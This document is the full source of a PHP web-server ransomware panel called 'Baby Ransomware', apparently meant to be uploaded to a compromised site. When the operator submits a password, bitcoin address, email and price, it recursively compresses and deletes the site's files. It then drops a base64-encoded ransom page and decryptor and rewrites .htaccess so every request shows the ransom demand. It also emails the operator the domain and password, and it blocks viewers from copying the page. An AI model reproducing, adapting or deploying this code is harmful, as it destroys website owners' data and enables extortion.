<!DOCTYPE html>
<html lang="en">
<head>
	<title># Coded By ErrorByte@AnarchoXploit #</title>
</head>
<body>
<link rel="shortcut icon" type="image/x-icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
<style> html {background: black; color: white; } input { background: transparent; color: white; border: 1px solid white; }
 body {background: #1A1C1F; color: #e2e2e2; } a{color:green; } ::-webkit-scrollbar-thumb:hover {cursor: none; } ::-webkit-scrollbar {cursor: none; } ::-webkit-scrollbar-track {cursor: none; } ::-webkit-scrollbar-thumb {cursor: none; } a:hover{cursor: none;} 
</style>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
  <script type="text/javascript">
    $(function() { $(this).bind("contextmenu", function(e) { e.preventDefault(); }); });
      document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
              return false;
            } else {
                return true;
            }
      };
      $(document).keypress("u",function(e) {
        if(e.ctrlKey){
          return false;
        }
        else{
          return true;
        }
      });
  </script>
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

if(isset($_POST['pass'])) {

function encfile($CreateFileEncryptionname){
	if (strpos($CreateFileEncryptionname, '.crypt') !== false) {
    	return;
	}
	file_put_contents($CreateFileEncryptionname.".crypt", gzdeflate(file_get_contents($CreateFileEncryptionname), 9));
	unlink($CreateFileEncryptionname);

	copy('.htaccess','.htaccessBackup');

	$CreateFileEncryption = base64_decode("PHRpdGxlPkJhYnkgSGFja2VyIFJhbnNvbXdhcmU8L3RpdGxlPgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9pbWcuZGV1c20uY29tL2RhcmtyZWFkaW5nL2JoLWFzaWEtZmFjZWJvb2stcHJvZmlsZS5wbmciPgo8c3R5bGU+IGh0bWwge2JhY2tncm91bmQ6IGJsYWNrOyBjb2xvcjogd2hpdGU7IH0gaW5wdXQgeyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgY29sb3I6IHdoaXRlOyBib3JkZXI6IDFweCBzb2xpZCB3aGl0ZTsgfSA8L3N0eWxlPgo8Y2VudGVyPgo8aDE+QmFieSBIYWNrZXIgUmFuc29td2FyZTwvaDE+CjxpbWcgaGVpZ2h0PSIyMDAiIHNyYz0iaHR0cHM6Ly9pLnNjcmVlbnNob3QubmV0L2s0ejA2dW4iLz4KPGJyPjxicj4KPGgzPllvdXIgV2Vic2l0ZSBJcyBFbmNyeXB0ZWQ8L2gzPgpEb24ndCBDaGFuZ2UgdGhlIEZpbGVuYW1lIGJlY2F1c2UgaXQgQ2FuIERhbWFnZSB0aGUgRmlsZSBJZiBZb3UgV2FudCB0byBSZXR1cm4gWW91IE11c3QgRW50ZXIgdGhlIFBhc3N3b3JkIEZpcnN0Cjxicj4KU2VuZCBNZSAkMyBGb3IgQmFjayBZb3VyIFdlYnNpdGUgPGJyPjxicj4KQml0Y29pbiBBZGRyZXNzIDogPGlucHV0IHR5cGU9InRleHQiIHZhbHVlPSJrb250b2xhbmppbmciIHJlYWRvbmx5Pgo8YnI+PGJyPgo8Zm9ybSBhY3Rpb249ImRlY3J5cHQucGhwIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPgo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIj4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkRlY3J5cHQiPgo8L2Zvcm0+Cjxicj5Db250YWN0IE1haWwgOiBiYWJ5QGhhY2tlci5vcmc=");

	$CreateFileDecryption = base64_decode("PD9waHAKaW5pX3NldCgnbWVtb3J5X2xpbWl0JywgLTEpOwplcnJvcl9yZXBvcnRpbmcoMCk7CglmdW5jdGlvbiBkZWNmaWxlKCRmaWxlbmFtZSl7CgkJaWYgKHN0cnBvcygkZmlsZW5hbWUsICcuY3J5cHQnKSA9PT0gRkFMU0UpIHsKCQkJcmV0dXJuOwoJCX0KCQkkZGVjcnlwdGVkID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlbmFtZSkpOwoJCWZpbGVfcHV0X2NvbnRlbnRzKHN0cl9yZXBsYWNlKCcuY3J5cHQnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7CgkJdW5saW5rKCdjcnlwdC5waHAnKTsKCQl1bmxpbmsoJy5odGFjY2VzcycpOwoJCXVubGluaygkZmlsZW5hbWUpOwoJCWVjaG8gIiRmaWxlbmFtZSBEZWNyeXB0ZWQuPGJyPiI7Cgl9CgoJZnVuY3Rpb24gZGVjZGlyKCRkaXIpewoJCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7CgkJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7CgkJCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsKCQkJCQlkZWNkaXIoJGRpci4iLyIuJGZpbGUpOwoJCQkJfWVsc2UgewoJCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOwoJCQl9CgkJfQoJfQoJaWYoaXNzZXQoJF9QT1NUWydwYXNzJ10pKSB7CgkJJGlucHV0ID0gJF9QT1NUWydwYXNzJ107CgkJJHBhc3MgPSAiamFuY29ramFyYW4iOwoJCWlmKG1kNSgkaW5wdXQpID09ICRwYXNzKSB7CQkKCQkJJGRlYyA9IGRlY2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsKCQkJaWYgKCRkZWMpIHsKCQkJCWVjaG8gIjxicj5XZWJyb290IERlY3J5cHRlZDxicj4iOwoJCQkJdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsKCQkJCXVubGluaygnLmh0YWNjZXNzJyk7CgkJCQljb3B5KCdodGFiYWNrdXAnLCcuaHRhY2Nlc3MnKTsKCQkJCWVjaG8gJ1N1Y2Nlc3MgRGVjcnlwdGVkLic7CgkJCX1lbHNlewoJCQkJZWNobyAnRmFpbGVkIERlY3J5cHRlZC4nOwoJCQl9CgkJfSBlbHNlIHsKCQkJZWNobyAnRmFpbGVkIFBhc3N3b3JkJzsKCQl9CgkJZXhpdCgpOwoJfQo/Pg==");

	$ReplacePassowrd = str_replace('jancokjaran', md5($_POST['pass']), $CreateFileDecryption);
	$FinalFileDecryption = $ReplacePassowrd;

	$w = str_replace('baby@hacker.org', $_POST['email'], $CreateFileEncryption);
	$e = str_replace('kontolanjing', $_POST['btc'], $w);
	$r = str_replace('$3', '$'.$_POST['price'], $e);
	$dec = $r;
	$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";

	$cok = fopen('crypt.php', 'w');
	fwrite($cok, $dec);
	fclose($cok);

	$decryptFile = fopen('decrypt.php', 'w');
	fwrite($decryptFile, $FinalFileDecryption);
	fclose($decryptFile);

	$htaccessCode = 	"DirectoryIndex crypt.php
						ErrorDocument 400 /crypt.php
						ErrorDocument 403 /crypt.php
						ErrorDocument 404 /crypt.php
						ErrorDocument 500 /crypt.php
						ErrorDocument 502 /crypt.php";

	$ht = fopen('.htaccess', 'w');
	fwrite($ht, $htaccessCode);
	fclose($ht);
	echo "$CreateFileEncryptionname Encrypted.<br>";
}
function encdir($dir){
	$CreateFileEncryptions = array_diff(scandir($dir), array('.', '..'));
	foreach($CreateFileEncryptions as $CreateFileEncryption) {

		if(is_dir($dir."/".$CreateFileEncryption)){
			encdir($dir."/".$CreateFileEncryption);
		} else {
			encfile($dir."/".$CreateFileEncryption);
		}

	}
}
// ------------------------------------------------------------------------
// main page. 
if(isset($_POST['pass'])){
	$en = encdir($_SERVER['DOCUMENT_ROOT'].'/ransomeware');
	if ($en) {
		// copy in root
			copy('crypt.php',   			$_SERVER['DOCUMENT_ROOT'].'/crypt.php');
			copy('decrypt.php', 			$_SERVER['DOCUMENT_ROOT'].'/decrypt.php');
			copy('csrf.php', 				$_SERVER['DOCUMENT_ROOT'].'/csrf.php');
			copy('img_tumb_avatar200x900sizes.php', 				$_SERVER['DOCUMENT_ROOT'].'/img_tumb_avatar200x900sizes.php');
			copy('.htaccess',		        $_SERVER['DOCUMENT_ROOT'].'.htaccess');   
			copy('.htaccess',		        $_SERVER['DOCUMENT_ROOT'].'.htaccessBackup');
			copy('error.php',		        $_SERVER['DOCUMENT_ROOT'].'/ransomeware');

			$to			= 	$_POST['email'];
			$subject	= 	'Your Ransomware Info';
			$message	= 	"Domain : ".$_SERVER['HTTP_ADDR']."\n\n"."Your Password : ".$_POST['pass'];
			$send		=	mail($to,$subject,$message);

			if($send) {
				echo 'Success send via email';
			} else {
				echo 'Failed to send email';
			}	exit();
			header('Location: ../');
		}
	}else{
		echo 'Encrypt failed.';
	}
}

?>

<center>
<h1>Baby Ransomware</h1>
<img height="200" src="https://i.screenshot.net/k4z06un" alt="baby" /><br/><br/>

<h3>Information Server :</h3> <hr/>

Path File : 		<font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function :  <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : 	<font color="red"><?php if(mail('sec.hfzrmd@gmail.com','tes','tes')) { echo "ON"; } else { echo "OFF"; } ?></font><br><br>

<form enctype="multipart/form-data" method="post">
	Password Encrypt : <input type="text" name="pass"> Your Email : <input type="text" name="email"><br><br>
	Your Bitcoin Address : <input type="text" name="btc"> Your Price : <input type="text" name="price"><br><br>
	<input type="submit" value="Encrypt">
</form>

</center>
</body>
</html>